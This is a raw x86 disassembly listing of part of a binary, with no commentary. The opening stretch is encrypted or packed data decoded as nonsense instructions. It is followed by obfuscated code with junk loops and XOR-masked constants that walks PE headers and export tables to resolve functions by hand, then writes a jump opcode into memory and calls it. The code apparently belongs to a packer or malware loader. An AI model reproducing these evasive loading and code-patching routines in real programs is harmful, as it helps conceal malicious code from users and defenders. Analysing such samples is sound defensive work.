  4230ca:	cs xchg edi,eax
  4230cc:	cdq    
  4230cd:	pop    edx
  4230ce:	loope  0x42305f
  4230d0:	push   0xd082b23c
  4230d5:	(bad)  
  4230d6:	retf   
  4230d7:	jne    0x423108
  4230d9:	pushf  
  4230da:	sbb    BYTE PTR [eax+0x274b755],al
  4230e0:	repz mov edx,0xc0d34327
  4230e6:	inc    edi
  4230e8:	add    esp,ebp
  4230ea:	mov    ds:0xe0a814f7,eax
  4230ef:	add    eax,0x3d88e025
  4230f4:	pop    edi
  4230f5:	xchg   esp,eax
  4230f6:	test   al,bh
  4230f8:	sbb    bh,BYTE PTR [ebx]
  4230fa:	nop
  4230fb:	and    esi,eax
  4230fd:	das    
  4230fe:	in     al,0xd6
  423100:	pop    ss
  423101:	mov    esi,0x62ebde48
  423106:	mov    eax,ds:0x2296abc6
  42310b:	xchg   DWORD PTR [edx+0xa],esp
  42310e:	add    DWORD PTR [ebp+0x7e358054],esp
  423114:	lahf   
  423115:	inc    eax
  423116:	mov    esi,0x4b5720e7
  42311b:	dec    eax
  42311c:	pop    esp
  42311d:	stos   BYTE PTR es:[edi],al
  42311e:	shl    BYTE PTR [ecx-0x7],cl
  423121:	inc    ebp
  423122:	hlt    
  423123:	jns    0x4230e6
  423125:	aam    0xf9
  423127:	cmp    al,0x82
  423129:	aad    0x68
  42312b:	push   ecx
  42312c:	ficom  WORD PTR [ebx-0x14]
  42312f:	aam    0x67
  423131:	inc    edi
  423132:	clc    
  423133:	imul   ecx,DWORD PTR [ebx-0x1f52bd7],0xfffffff1
  42313a:	jae    0x423199
  42313c:	ins    DWORD PTR es:[edi],dx
  42313d:	push   ss
  42313e:	icebp  
  42313f:	mov    ebp,0x87f90c09
  423144:	(bad)  
  423145:	jg     0x423122
  423147:	xor    ecx,DWORD PTR [esi]
  423149:	cwde   
  42314a:	sub    ebp,DWORD PTR ds:0x8c0519b
  423150:	in     eax,0x54
  423152:	out    0xb6,al
  423154:	shl    DWORD PTR [edx+0x1a64b160],cl
  42315a:	pop    ebp
  42315b:	cli    
  42315c:	mov    dh,0x21
  42315e:	mov    edx,0xf518d7f3
  423163:	xor    BYTE PTR [ecx],0x14
  423166:	jb     0x423105
  423168:	stos   DWORD PTR es:[edi],eax
  423169:	sbb    al,0xa7
  42316b:	call   0xf55c2a77
  423170:	jae    0x423154
  423172:	lock jbe 0x4231f4
  423175:	jb     0x4231ba
  423177:	pop    esp
  423178:	adc    DWORD PTR [edx],esp
  42317a:	cmp    DWORD PTR [esi-0x47],eax
  42317d:	loop   0x4231c4
  42317f:	xor    eax,0xad3bfd21
  423184:	inc    ecx
  423185:	xor    eax,0xeb9ec20a
  42318a:	xor    ecx,DWORD PTR [edx+edx*2]
  42318d:	mov    BYTE PTR [edx+0x6032366],bh
  423193:	cmp    DWORD PTR [esi+0x297fbbc3],0xffffffe1
  42319a:	cmp    BYTE PTR [ecx],dh
  42319c:	xchg   BYTE PTR [ebx],ah
  42319e:	nop
  42319f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231a0:	jb     0x4231ff
  4231a2:	cmc    
  4231a3:	cmp    eax,ebp
  4231a5:	xchg   esi,eax
  4231a6:	and    DWORD PTR [ebx],ecx
  4231a8:	jle    0x42318a
  4231aa:	data16 and bh,BYTE PTR [eax]
  4231ad:	xor    eax,DWORD PTR [ecx]
  4231af:	and    BYTE PTR fs:[edi],cl
  4231b2:	fstp   TBYTE PTR [esi+0x29]
  4231b5:	js     0x42320c
  4231b7:	(bad)  
  4231b9:	mov    eax,DWORD PTR [ecx+0x72134de6]
  4231bf:	sbb    BYTE PTR [esi+0x62],ah
  4231c2:	scas   eax,DWORD PTR es:[edi]
  4231c3:	and    dh,BYTE PTR [eax-0x3b]
  4231c6:	sbb    al,0x38
  4231c8:	lods   eax,DWORD PTR ds:[esi]
  4231c9:	(bad)  
  4231ca:	adc    dh,BYTE PTR [ebp-0x456c396]
  4231d0:	mov    esi,?
  4231d2:	ret    
  4231d3:	jp     0x4231f4
  4231d5:	test   al,al
  4231d7:	xchg   BYTE PTR [esi+0x3b],bh
  4231da:	fldenv [esp+ebx*1+0x465ab81]
  4231e1:	scas   eax,DWORD PTR es:[edi]
  4231e2:	and    eax,0xa365ca56
  4231e7:	inc    esi
  4231e8:	in     eax,0x17
  4231ea:	stos   BYTE PTR es:[edi],al
  4231eb:	dec    edx
  4231ec:	mov    edi,0x67269d3c
  4231f1:	push   ss
  4231f2:	pop    ds
  4231f3:	adc    ecx,ebp
  4231f5:	adc    eax,0xef3db6d3
  4231fa:	inc    eax
  4231fb:	add    ah,BYTE PTR [edi-0x15deb08a]
  423201:	jnp    0x42323f
  423203:	test   DWORD PTR [edx],edi
  423205:	inc    ebx
  423206:	mov    edx,0xe8a939f0
  42320b:	adc    eax,0x86a3c1e
  423210:	dec    ebx
  423211:	lds    edi,FWORD PTR [edx-0x2c14f96b]
  423217:	imul   BYTE PTR [eax+0xa208c41]
  42321d:	add    DWORD PTR [esi-0x28510e39],esi
  423223:	sar    BYTE PTR [edx-0x1ce684dc],1
  423229:	out    0x4e,eax
  42322b:	lea    edi,[ecx]
  42322d:	ror    edi,1
  42322f:	ficomp WORD PTR [ebp-0x5c]
  423232:	pushf  
  423233:	popa   
  423234:	add    al,0x46
  423236:	stc    
  423237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423238:	push   edx
  423239:	test   eax,0x809aad7b
  42323e:	sub    DWORD PTR [esi+0x5a],eax
  423241:	popa   
  423242:	adc    al,0x27
  423244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423245:	lea    esp,[esi-0x63d33f]
  42324b:	and    ebp,DWORD PTR [eax+0x42f402c6]
  423251:	cli    
  423252:	stos   BYTE PTR es:[edi],al
  423253:	test   al,0xac
  423255:	push   ebx
  423256:	pop    ebp
  423257:	sar    DWORD PTR [edi-0x39],1
  42325a:	mov    ds:0xb321eda3,al
  42325f:	cmp    eax,0x8a22d9d5
  423264:	mov    gs,WORD PTR [edi+0x392e70dc]
  42326a:	repz mov ebp,0x59e9edc8
  423270:	cwde   
  423271:	int    0xef
  423273:	fsubrp st(6),st
  423275:	call   0x233c:0x57fa1e47
  42327c:	jno    0xfca4483c
  423282:	adc    DWORD PTR [eax+0x1a],edx
  423285:	pop    es
  423286:	push   es
  423287:	sahf   
  423288:	and    bh,BYTE PTR [esp+edx*4-0x7d]
  42328c:	cmp    di,WORD PTR [ebx]
  42328f:	dec    ecx
  423290:	adc    ecx,esp
  423292:	mul    BYTE PTR [ebp+0x620fb759]
  423298:	cmc    
  423299:	mov    ds:0x4ba6299,eax
  42329e:	les    esi,FWORD PTR [edx]
  4232a0:	aad    0x41
  4232a2:	jl     0x4232eb
  4232a4:	mov    ecx,0x62233ccd
  4232a9:	mov    al,0x3e
  4232ab:	mov    bl,0xa6
  4232ad:	inc    ecx
  4232ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232af:	xchg   esp,eax
  4232b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232b1:	cmp    ah,bh
  4232b3:	adc    bh,0x70
  4232b6:	adc    al,0x5
  4232b8:	nop
  4232b9:	xchg   ebx,eax
  4232ba:	int3   
  4232bb:	int    0x2f
  4232bd:	sti    
  4232be:	mov    ds:0x81524f89,eax
  4232c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232c4:	sbb    esp,DWORD PTR [ebx-0x46a9af8b]
  4232ca:	call   0x88ecc951
  4232cf:	aad    0xdb
  4232d1:	jo     0x42325e
  4232d3:	test   DWORD PTR [edx+0x1e4272dd],ecx
  4232d9:	outs   dx,BYTE PTR ds:[esi]
  4232da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232db:	ins    DWORD PTR es:[edi],dx
  4232dc:	cs clc 
  4232de:	idiv   ah
  4232e0:	pop    ebx
  4232e1:	add    bl,BYTE PTR [eax+0x17]
  4232e4:	jecxz  0x4232cf
  4232e6:	pushf  
  4232e7:	cli    
  4232e8:	data16 stos BYTE PTR es:[edi],al
  4232ea:	cmp    BYTE PTR [esi-0x33],bl
  4232ed:	ja     0x4232ef
  4232ef:	pusha  
  4232f0:	mov    dh,0x45
  4232f2:	cld    
  4232f3:	es mov ch,0xd5
  4232f6:	scas   al,BYTE PTR es:[edi]
  4232f7:	(bad)  
  4232f8:	outs   dx,DWORD PTR ds:[esi]
  4232f9:	push   ecx
  4232fa:	in     al,dx
  4232fb:	test   al,0xe5
  4232fe:	pop    es
  4232ff:	cmc    
  423300:	cmp    eax,0x36af1c28
  423305:	cmp    DWORD PTR [ebx-0x8],eax
  423308:	scas   eax,DWORD PTR es:[edi]
  423309:	scas   al,BYTE PTR es:[edi]
  42330a:	imul   edi,DWORD PTR [esi],0x7
  42330d:	jl     0x4232c0
  42330f:	cmp    BYTE PTR [esi-0x77],dh
  423312:	inc    ebp
  423313:	loopne 0x4232a0
  423315:	inc    ebp
  423316:	cld    
  423317:	mov    ecx,DWORD PTR [ebp-0x4]
  42331a:	sub    eax,ecx
  42331c:	mov    DWORD PTR [ebp-0x4],eax
  42331f:	or     DWORD PTR [ebp-0x4],0xf89c85be
  423326:	mov    eax,DWORD PTR [ebp-0xc]
  423329:	xor    eax,esi
  42332b:	add    eax,edi
  42332d:	push   eax
  42332e:	mov    eax,DWORD PTR [ebp-0x10]
  423331:	xor    eax,esi
  423333:	add    eax,edi
  423335:	push   eax
  423336:	mov    eax,DWORD PTR [ebp-0x4]
  423339:	xor    eax,esi
  42333b:	add    eax,edi
  42333d:	push   eax
  42333e:	lea    eax,[ebp-0x78]
  423341:	push   eax
  423342:	push   DWORD PTR [ebp-0x2c]
  423345:	push   DWORD PTR [ebp-0x28]
  423348:	call   0x413e4f
  42334d:	test   eax,eax
  42334f:	je     0x42337d
  423355:	lea    eax,[ebp-0x78]
  423358:	push   eax
  423359:	mov    eax,DWORD PTR [ebp-0x28]
  42335c:	xor    eax,esi
  42335e:	add    eax,edi
  423360:	push   eax
  423361:	mov    eax,DWORD PTR [ebp-0x24]
  423364:	add    eax,0xaa
  423369:	push   eax
  42336a:	mov    eax,DWORD PTR [ebp-0x24]
  42336d:	mov    eax,DWORD PTR [eax+0x198]
  423373:	push   DWORD PTR [eax]
  423375:	call   0x40a988
  42337a:	mov    DWORD PTR [ebp-0x14],eax
  42337d:	mov    ecx,DWORD PTR ds:0x429516
  423383:	lea    eax,[ebp+0x4]
  423386:	mov    DWORD PTR [ecx*4+0x42950e],eax
  42338d:	inc    DWORD PTR ds:0x429516
  423393:	mov    eax,DWORD PTR [ebp-0x14]
  423396:	test   eax,eax
  423398:	je     0x423400
  42339e:	lea    eax,[ebp-0x8]
  4233a1:	mov    DWORD PTR [ebp-0x34],eax
  4233a4:	mov    eax,DWORD PTR [ebp-0x30]
  4233a7:	mov    DWORD PTR [ebp-0x8],eax
  4233aa:	mov    eax,DWORD PTR [ebp-0x8]
  4233ad:	mov    ecx,DWORD PTR [ebp-0x14]
  4233b0:	sub    eax,ecx
  4233b2:	mov    DWORD PTR [ebp-0x8],eax
  4233b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4233b8:	xor    ecx,esi
  4233ba:	mov    eax,0xffcd8d0f
  4233bf:	sub    eax,ecx
  4233c1:	add    DWORD PTR [ebp-0x8],eax
  4233c4:	mov    eax,DWORD PTR [ebp-0x8]
  4233c7:	mov    ecx,DWORD PTR [ebp-0x14]
  4233ca:	mov    DWORD PTR [ecx+0x1],eax
  4233cd:	mov    eax,DWORD PTR [ebp-0x14]
  4233d0:	push   DWORD PTR [ebp-0x24]
  4233d3:	mov    BYTE PTR [eax],0xe9
  4233d6:	mov    eax,ds:0x42929a
  4233db:	push   DWORD PTR [eax]
  4233dd:	push   DWORD PTR ds:0x4294fe
  4233e3:	push   DWORD PTR ds:0x4292a2
  4233e9:	push   DWORD PTR ds:0x4294de
  4233ef:	push   DWORD PTR ds:0x42a04a
  4233f5:	push   DWORD PTR [ebp-0x28]
  4233f8:	push   DWORD PTR [ebp-0x2c]
  4233fb:	mov    eax,DWORD PTR [ebp-0x14]
  4233fe:	call   eax
  423400:	pop    edi
  423401:	pop    esi
  423402:	leave  
  423403:	ret    
  423404:	push   ebp
  423405:	mov    ebp,esp
  423407:	sub    esp,0x1c
  42340a:	and    DWORD PTR ds:0x42a2ae,0x0
  423414:	mov    ecx,DWORD PTR ds:0x42a2ae
  42341a:	inc    ecx
  42341b:	mov    DWORD PTR ds:0x42a2ae,ecx
  423421:	cmp    DWORD PTR ds:0x42a2ae,0x27
  423428:	jle    0x423450
  42342e:	jmp    0x423443
  423433:	push   0x42a262
  423438:	push   0x429153
  42343d:	call   DWORD PTR ds:0x42a3f2
  423443:	cmp    DWORD PTR ds:0x42a2ae,0x1c
  42344a:	jb     0x423414
  423450:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  423457:	lea    eax,[ebp+0x14]
  42345a:	add    DWORD PTR ds:0x42a272,ebx
  423460:	mov    DWORD PTR [ebp-0x4],eax
  423463:	and    DWORD PTR ds:0x42a2de,0x0
  42346d:	jmp    0x423481
  423472:	xor    ecx,ecx
  423474:	or     ecx,DWORD PTR ds:0x42a2de
  42347a:	inc    ecx
  42347b:	mov    DWORD PTR ds:0x42a2de,ecx
  423481:	cmp    DWORD PTR ds:0x42a2de,0x13
  423488:	jae    0x4234cd
  42348e:	cmp    DWORD PTR ds:0x42a2de,0x7
  423495:	ja     0x4234cd
  42349b:	jmp    0x4234ac
  4234a0:	push   DWORD PTR [ebp-0x10]
  4234a3:	push   DWORD PTR [ebp-0xc]
  4234a6:	call   DWORD PTR ds:0x42a3c2
  4234ac:	cmp    DWORD PTR ds:0x42a2de,0x6
  4234b3:	jne    0x4234c8
  4234b9:	xor    ecx,ecx
  4234bb:	or     ecx,DWORD PTR ds:0x42a2de
  4234c1:	inc    ecx
  4234c2:	mov    DWORD PTR ds:0x42a2de,ecx
  4234c8:	jmp    0x423472
  4234cd:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4234d4:	and    DWORD PTR ds:0x42a2ba,0x0
  4234de:	xor    edx,edx
  4234e0:	xor    edx,DWORD PTR ds:0x42a2ba
  4234e6:	inc    edx
  4234e7:	mov    DWORD PTR ds:0x42a2ba,edx
  4234ed:	cmp    DWORD PTR ds:0x42a2ba,0x25
  4234f4:	jb     0x423520
  4234fa:	jmp    0x423513
  4234ff:	push   DWORD PTR [ebp-0x10]
  423502:	push   0x42a2ae
  423507:	push   DWORD PTR [ebp-0x10]
  42350a:	push   DWORD PTR [ebp-0x20]
  42350d:	call   DWORD PTR ds:0x42a3f6
  423513:	cmp    DWORD PTR ds:0x42a2ba,0x1e
  42351a:	jb     0x4234de
  423520:	lea    eax,[ebp-0xc]
  423523:	xor    ecx,ecx
  423525:	mov    DWORD PTR [ebp-0x14],eax
  423528:	or     eax,DWORD PTR ds:0x42a25e
  42352e:	mov    eax,DWORD PTR [ebp-0xc]
  423531:	and    DWORD PTR ds:0x42a2da,ebx
  423537:	mov    edx,DWORD PTR [ebp-0x14]
  42353a:	mov    DWORD PTR ds:0x42a2a6,0x55c4
  423544:	mov    ecx,0x75108aa
  423549:	xor    eax,ecx
  42354b:	sub    DWORD PTR ds:0x42a26a,0x3296
  423555:	add    eax,0x3272f1
  42355a:	mov    DWORD PTR [edx],eax
  42355c:	add    edx,eax
  42355e:	mov    eax,ds:0x429296
  423563:	mov    DWORD PTR ds:0x42a2da,0x12
  42356d:	cmp    DWORD PTR ds:0x42a2da,0x0
  423574:	je     0x4235c8
  42357a:	cmp    DWORD PTR ds:0x42a2da,0x5
  423581:	jb     0x4235c8
  423587:	jmp    0x42359c
  42358c:	push   0x471b
  423591:	push   0x42a2a6
  423596:	call   DWORD PTR ds:0x42a3fa
  42359c:	cmp    DWORD PTR ds:0x42a2da,0x6
  4235a3:	jne    0x4235b6
  4235a9:	mov    edx,DWORD PTR ds:0x42a2da
  4235af:	dec    edx
  4235b0:	mov    DWORD PTR ds:0x42a2da,edx
  4235b6:	mov    edx,DWORD PTR ds:0x42a2da
  4235bc:	dec    edx
  4235bd:	mov    DWORD PTR ds:0x42a2da,edx
  4235c3:	jmp    0x42356d
  4235c8:	mov    edx,DWORD PTR [ebp-0x4]
  4235cb:	mov    eax,DWORD PTR [eax]
  4235cd:	add    eax,DWORD PTR [edx]
  4235cf:	sub    DWORD PTR ds:0x42a2da,ebx
  4235d5:	push   esi
  4235d6:	sub    edx,edx
  4235d8:	mov    DWORD PTR [ebp-0x8],eax
  4235db:	mov    edx,DWORD PTR [ebp+0x8]
  4235de:	mov    eax,ds:0x42941e
  4235e3:	mov    eax,DWORD PTR [eax+0x198]
  4235e9:	xor    edx,ecx
  4235eb:	or     DWORD PTR ds:0x42a2ca,ebx
  4235f1:	mov    esi,0x3272f1
  4235f6:	adc    DWORD PTR ds:0x42a262,0x42a296
  423600:	add    edx,esi
  423602:	mov    DWORD PTR ds:0x42a2ae,0x33f
  42360c:	cmp    DWORD PTR [eax],edx
  42360e:	mov    DWORD PTR ds:0x42a29e,0x6ec0
  423618:	je     0x423639
  42361e:	mov    DWORD PTR ds:0x42a2d2,0x6d4b
  423628:	mov    eax,DWORD PTR [eax]
  42362a:	mov    DWORD PTR ds:0x42a296,0x79fc
  423634:	jmp    0x423a5e
  423639:	mov    eax,DWORD PTR [ebp+0x18]
  42363c:	xor    eax,ecx
  42363e:	and    DWORD PTR ds:0x42a27a,0x42a26a
  423648:	push   ebx
  423649:	and    DWORD PTR ds:0x42a2c2,0x0
  423653:	jmp    0x423667
  423658:	xor    ebx,ebx
  42365a:	xor    ebx,DWORD PTR ds:0x42a2c2
  423660:	inc    ebx
  423661:	mov    DWORD PTR ds:0x42a2c2,ebx
  423667:	cmp    DWORD PTR ds:0x42a2c2,0x1b
  42366e:	jae    0x423694
  423674:	cmp    DWORD PTR ds:0x42a2c2,0x26
  42367b:	jb     0x423694
  423681:	jmp    0x42368f
  423686:	push   DWORD PTR [ebp-0x20]
  423689:	call   DWORD PTR ds:0x42a3c6
  42368f:	jmp    0x423658
  423694:	add    eax,esi
  423696:	sub    ebx,DWORD PTR ds:0x42a266
  42369c:	xor    edx,edx
  42369e:	mov    ebx,0xfabdbed8
  4236a3:	and    DWORD PTR ds:0x42a302,0x5581
  4236ad:	add    eax,ebx
  4236af:	push   edi
  4236b0:	mov    DWORD PTR ds:0x42a2de,0x181
  4236ba:	adc    edx,0xffffffff
  4236bd:	movzx  edi,BYTE PTR ds:0x42a2fa
  4236c4:	adc    DWORD PTR ds:0x42a2d2,edi
  4236ca:	mov    edi,0x8a29a13d
  4236cf:	xor    eax,edi
  4236d1:	xor    edx,0x0
  4236d4:	cmp    eax,0x70941fe5
  4236d9:	jne    0x4236fc
  4236df:	cmp    edx,0xffffffff
  4236e2:	mov    DWORD PTR ds:0x42a2d6,0x6011
  4236ec:	jne    0x4236fc
  4236f2:	push   0xf89c85ba
  4236f7:	jmp    0x423a4b
  4236fc:	mov    eax,DWORD PTR [ebp+0x18]
  4236ff:	xor    eax,ecx
  423701:	adc    DWORD PTR ds:0x42a29a,0x42a2d6
  42370b:	add    eax,esi
  42370d:	mov    DWORD PTR ds:0x42a2f2,0x535
  423717:	xor    edx,edx
  423719:	xor    DWORD PTR ds:0x42a2de,0x42a286
  423723:	add    eax,ebx
  423725:	adc    edx,0xffffffff
  423728:	xor    eax,edi
  42372a:	xor    edx,0x0
  42372d:	mov    DWORD PTR ds:0x42a26a,0x15dc
  423737:	cmp    eax,0x70941fe7
  42373c:	mov    DWORD PTR ds:0x42a2da,0x1950
  423746:	jne    0x423a38
  42374c:	mov    DWORD PTR ds:0x42a2a2,0x37f9
  423756:	cmp    edx,0xffffffff
  423759:	jne    0x423a38
  42375f:	add    edx,DWORD PTR ds:0x42a286
  423765:	mov    eax,DWORD PTR [ebp+0x10]
  423768:	movzx  edx,WORD PTR ds:0x42a2da
  42376f:	xor    DWORD PTR ds:0x42a2f6,edx
  423775:	xor    eax,ecx
  423777:	add    DWORD PTR ds:0x42a292,0x42a302
  423781:	add    eax,esi
  423783:	mov    DWORD PTR [ebp-0x18],eax
  423786:	mov    eax,DWORD PTR [ebp+0xc]
  423789:	mov    edx,DWORD PTR [ebp-0x8]
  42378c:	xor    eax,ecx
  42378e:	add    eax,esi
  423790:	xor    DWORD PTR ds:0x42a2be,0x55ef
  42379a:	imul   eax,DWORD PTR [edx]
  42379d:	mov    DWORD PTR ds:0x42a296,0x1045
  4237a7:	mov    edx,DWORD PTR [ebp+0x8]
  4237aa:	sub    DWORD PTR ds:0x42a2f6,0x3ea4
  4237b4:	xor    edx,ecx
  4237b6:	adc    DWORD PTR ds:0x42a2e2,0x475c
  4237c0:	add    edx,esi
  4237c2:	mov    DWORD PTR ds:0x42a2be,0x342
  4237cc:	cmp    edx,eax
  4237ce:	mov    DWORD PTR ds:0x42a2b6,0x7ea6
  4237d8:	mov    eax,DWORD PTR [ebp-0x4]
  4237db:	je     0x4238b5
  4237e1:	mov    edx,DWORD PTR [ebp-0x18]
  4237e4:	sub    DWORD PTR ds:0x42a2aa,0x2e10
  4237ee:	add    DWORD PTR [eax],edx
  4237f0:	xor    DWORD PTR ds:0x42a2c6,ebx
  4237f6:	mov    eax,DWORD PTR [ebp-0x4]
  4237f9:	mov    edx,DWORD PTR ds:0x42a27e
  4237ff:	and    DWORD PTR ds:0x42a2ee,edx
  423805:	mov    edx,DWORD PTR [ebp+0xc]
  423808:	or     DWORD PTR ds:0x42a2c6,0x42a2ea
  423812:	xor    edx,ecx
  423814:	xor    DWORD PTR ds:0x42a2a2,0x2c59
  42381e:	add    edx,esi
  423820:	add    DWORD PTR ds:0x42a25a,0x1203
  42382a:	imul   edx,DWORD PTR [eax]
  42382d:	mov    DWORD PTR [eax],edx
  42382f:	mov    eax,DWORD PTR [ebp-0x4]
  423832:	mov    DWORD PTR [ebp-0x1c],eax
  423835:	and    DWORD PTR ds:0x42a2de,0x0
  42383f:	jmp    0x42384f
  423844:	mov    eax,ds:0x42a2de
  423849:	inc    eax
  42384a:	mov    ds:0x42a2de,eax
  42384f:	cmp    DWORD PTR ds:0x42a2de,0x1a
  423856:	jae    0x4238a1
  42385c:	cmp    DWORD PTR ds:0x42a2de,0xc
  423863:	jl     0x4238a1
  423869:	jmp    0x423881
  42386e:	push   DWORD PTR [ebp-0x10]
  423871:	push   0x1
  423873:	push   DWORD PTR [ebp-0x24]
  423876:	push   0x429153
  42387b:	call   DWORD PTR ds:0x42a3ca
  423881:	cmp    DWORD PTR ds:0x42a2de,0xb
  423888:	jne    0x42389c
  42388e:	xor    eax,eax
  423890:	xor    eax,DWORD PTR ds:0x42a2de
  423896:	inc    eax
  423897:	mov    ds:0x42a2de,eax
  42389c:	jmp    0x423844
  4238a1:	mov    eax,DWORD PTR [ebp+0x10]
  4238a4:	xor    eax,ecx
  4238a6:	mov    edx,0xffcd8d0f
  4238ab:	sub    edx,eax
  4238ad:	mov    eax,DWORD PTR [ebp-0x1c]
  4238b0:	jmp    0x4238cf
  4238b5:	mov    edx,DWORD PTR [ebp+0x14]
  4238b8:	xor    DWORD PTR [eax],edx
  4238ba:	mov    eax,DWORD PTR [ebp-0x4]
  4238bd:	mov    DWORD PTR [ebp-0x1c],eax
  4238c0:	mov    eax,DWORD PTR [ebp+0x10]
  4238c3:	xor    eax,ecx
  4238c5:	mov    edx,0xffcd8d0f
  4238ca:	sub    edx,eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x1c]
  4238cf:	add    DWORD PTR [eax],edx
  4238d1:	mov    eax,DWORD PTR [ebp-0x4]
  4238d4:	mov    edx,DWORD PTR [ebp-0x8]
  4238d7:	add    edx,DWORD PTR [eax]
  4238d9:	mov    DWORD PTR [ebp-0x8],edx
  4238dc:	mov    eax,DWORD PTR [ebp+0xc]
  4238df:	mov    edx,DWORD PTR [ebp+0xc]
  4238e2:	xor    edx,ecx
  4238e4:	xor    eax,ecx
  4238e6:	lea    eax,[eax+edx*1+0x64e5e2]
  4238ed:	mov    edx,DWORD PTR [ebp+0xc]
  4238f0:	xor    edx,ecx
  4238f2:	add    edx,esi
  4238f4:	imul   eax,edx
  4238f7:	mov    edx,DWORD PTR [ebp+0xc]
  4238fa:	xor    edx,ecx
  4238fc:	sub    edx,eax
  4238fe:	mov    eax,DWORD PTR [ebp-0x4]
  423901:	add    edx,esi
  423903:	cmp    DWORD PTR [eax],edx
  423905:	mov    eax,DWORD PTR [ebp-0x4]
  423908:	jg     0x423925
  42390e:	mov    DWORD PTR [ebp-0x1c],eax
  423911:	mov    eax,DWORD PTR [ebp+0x10]
  423914:	xor    eax,ecx
  423916:	mov    edx,0xffcd8d0f
  42391b:	sub    edx,eax
  42391d:	mov    eax,DWORD PTR [ebp-0x1c]
  423920:	jmp    0x42392c
  423925:	mov    edx,DWORD PTR [ebp+0x10]
  423928:	xor    edx,ecx
  42392a:	add    edx,esi
  42392c:	add    DWORD PTR [eax],edx
  42392e:	mov    eax,DWORD PTR [ebp-0x8]
  423931:	mov    edx,DWORD PTR [ebp-0x10]
  423934:	mov    eax,DWORD PTR [eax]
  423936:	xor    edx,ecx
  423938:	add    edx,0x3272f0
  42393e:	not    edx
  423940:	and    eax,edx
  423942:	mov    DWORD PTR [ebp-0x4],eax
  423945:	movsx  eax,BYTE PTR [eax+0x1]
  423949:	cdq    
  42394a:	add    eax,ebx
  42394c:	adc    edx,0xffffffff
  42394f:	xor    eax,edi
  423951:	xor    edx,0x0
  423954:	cmp    eax,0x70941e0f
  423959:	jne    0x42398d
  42395f:	cmp    edx,0xffffffff
  423962:	jne    0x42398d
  423968:	mov    eax,DWORD PTR [ebp-0x4]
  42396b:	movsx  eax,BYTE PTR [eax]
  42396e:	cdq    
  42396f:	add    eax,ebx
  423971:	adc    edx,0xffffffff
  423974:	xor    eax,edi
  423976:	xor    edx,0x0
  423979:	cmp    eax,0x70941e18
  42397e:	jne    0x42398d
  423984:	cmp    edx,0xffffffff
  423987:	je     0x4239a4
  42398d:	mov    eax,DWORD PTR [ebp-0x10]
  423990:	xor    eax,ecx
  423992:	mov    edx,0xffcd8d0f
  423997:	sub    edx,eax
  423999:	add    DWORD PTR [ebp-0x4],edx
  42399c:	mov    eax,DWORD PTR [ebp-0x4]
  42399f:	jmp    0x423945
  4239a4:	mov    eax,DWORD PTR [ebp-0x14]
  4239a7:	mov    eax,DWORD PTR [eax]
  4239a9:	mov    edx,DWORD PTR [ebp-0x4]
  4239ac:	mov    edx,DWORD PTR [edx+0x3c]
  4239af:	lea    eax,[edx+eax*8+0x78]
  4239b3:	mov    edx,DWORD PTR [ebp-0x4]
  4239b6:	mov    eax,DWORD PTR [eax+edx*1]
  4239b9:	mov    DWORD PTR [ebp-0x8],eax
  4239bc:	mov    eax,DWORD PTR [ebp+0x8]
  4239bf:	xor    eax,ecx
  4239c1:	add    eax,esi
  4239c3:	mov    DWORD PTR [ebp-0x14],eax
  4239c6:	mov    eax,DWORD PTR [ebp+0x8]
  4239c9:	mov    edx,DWORD PTR [ebp-0x8]
  4239cc:	xor    eax,ecx
  4239ce:	add    eax,esi
  4239d0:	cmp    edx,eax
  4239d2:	jne    0x4239f0
  4239d8:	mov    eax,DWORD PTR [ebp+0xc]
  4239db:	xor    eax,ecx
  4239dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4239e0:	add    eax,esi
  4239e2:	imul   eax,ecx
  4239e5:	mov    DWORD PTR [ebp-0x8],eax
  4239e8:	push   DWORD PTR [ebp+0x18]
  4239eb:	jmp    0x423a4b
  4239f0:	mov    eax,DWORD PTR [ebp-0x8]
  4239f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4239f6:	add    eax,ecx
  4239f8:	mov    DWORD PTR [ebp-0x14],eax
  4239fb:	mov    eax,DWORD PTR [ebp-0x14]
  4239fe:	mov    eax,DWORD PTR [eax+0xc]
  423a01:	movsx  eax,BYTE PTR [eax+ecx*1]
  423a05:	cdq    
  423a06:	add    eax,ebx
  423a08:	adc    edx,0xffffffff
  423a0b:	xor    eax,edi
  423a0d:	xor    edx,0x0
  423a10:	cmp    eax,0x70941e1e
  423a15:	jne    0x4239e8
  423a1b:	cmp    edx,0xffffffff
  423a1e:	jne    0x4239e8
  423a24:	mov    eax,ds:0x42941e
  423a29:	mov    eax,DWORD PTR [eax+0x198]
  423a2f:	mov    DWORD PTR [eax],ecx
  423a31:	mov    eax,ecx
  423a33:	jmp    0x423a5c
  423a38:	mov    eax,DWORD PTR [ebp+0x18]
  423a3b:	cmp    eax,0xf89c85ba
  423a40:	jne    0x423a5c
  423a46:	push   0xf89c85bb
  423a4b:	push   DWORD PTR [ebp+0x14]
  423a4e:	push   DWORD PTR [ebp+0x10]
  423a51:	push   DWORD PTR [ebp+0xc]
  423a54:	push   DWORD PTR [ebp+0x8]
  423a57:	call   0x423404
  423a5c:	pop    edi
  423a5d:	pop    ebx
  423a5e:	pop    esi
  423a5f:	leave  
  423a60:	ret    0x14
  423a63:	push   ebp
  423a64:	mov    ebp,esp
  423a66:	and    esp,0xfffffff8
  423a69:	add    DWORD PTR ds:0x42a2ae,0x42a2ee
  423a73:	sub    esp,0x3fc
  423a79:	add    DWORD PTR ds:0x42a25e,0x42a25a
  423a83:	push   ebx
  423a84:	mov    DWORD PTR ds:0x42a286,0x16c4
  423a8e:	push   esi
  423a8f:	push   edi
  423a90:	xor    edi,edi
  423a92:	adc    DWORD PTR ds:0x42a26e,0x6687
  423a9c:	push   edi
  423a9d:	sbb    DWORD PTR ds:0x42a29a,0x42a2e2
  423aa7:	push   edi
  423aa8:	and    DWORD PTR ds:0x42a2ca,0x42a2ce
